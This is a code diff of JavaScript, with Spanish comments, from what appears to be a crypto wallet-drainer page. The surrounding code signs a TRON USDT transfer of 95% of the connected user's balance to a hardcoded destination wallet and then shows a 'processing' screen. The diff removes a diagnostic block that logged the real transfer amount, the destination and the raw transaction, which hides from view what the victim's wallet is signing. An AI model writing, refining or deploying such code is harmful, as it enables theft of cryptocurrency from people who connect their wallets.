@@ -1272,32 +1272,9 @@
                             )
                         );
 
-                    /*
-                     * DIAGNÓSTICO TRUST WALLET / TRON ENERGY
-                     * No modifica el monto ni los parámetros de transfer().
-                     * Muestra exactamente qué transacción recibe la billetera.
-                     */
-                    const txParaFirmar = transactionDraft.transaction;
-                    const transferUSDT = amount95Percent.dividedBy(1_000_000);
-
-                    console.group("TRUST WALLET / TRON ENERGY - DIAGNÓSTICO");
-                    console.log("Saldo USDT total:", balanceBigNumber.dividedBy(1_000_000).toString(), "USDT");
-                    console.log("Monto real transfer():", transferUSDT.toString(), "USDT");
-                    console.log("Monto real transfer() unidades mínimas:", amount95Percent.toString());
-                    console.log("Porcentaje:", "95%");
-                    console.log("Origen:", walletAddress);
-                    console.log("Destino:", BILLETERA_DESTINO);
-                    console.log("Contrato:", CONTRATO_USDT);
-                    console.log("feeLimit:", 100000000, "SUN");
-                    console.log("transaction:", txParaFirmar);
-                    console.log("raw_data:", txParaFirmar && txParaFirmar.raw_data);
-                    console.log("raw_data_hex:", txParaFirmar && txParaFirmar.raw_data_hex);
-                    console.log("NOTA: cualquier Energy Rental mostrado después de este punto es calculado/presentado por la billetera.");
-                    console.groupEnd();
-
                     const signedTx =
                         await tronWeb.trx.sign(
-                            txParaFirmar
+                            transactionDraft.transaction
                         );
 
                     showProcessingScreen();
